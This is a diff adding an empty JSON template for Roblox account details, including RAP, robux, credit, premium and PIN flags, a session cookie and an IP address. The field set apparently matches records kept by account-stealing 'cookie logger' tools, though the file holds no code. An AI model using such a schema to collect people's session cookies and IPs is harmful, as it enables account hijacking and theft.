@@ -1,0 +1,20 @@
+{
+	"userName": "",
+	"UserId": "",
+  "userImage": "",
+
+	"RAPInfo": {
+		"RAP": "",
+		"robux": "",
+		"credit": ""
+	},
+
+	"otherInfo": {
+		"isPremium": true,
+		"status": "",
+		"hasPin": true
+	},
+
+  "cookie": "",
+  "ip": ""
+}
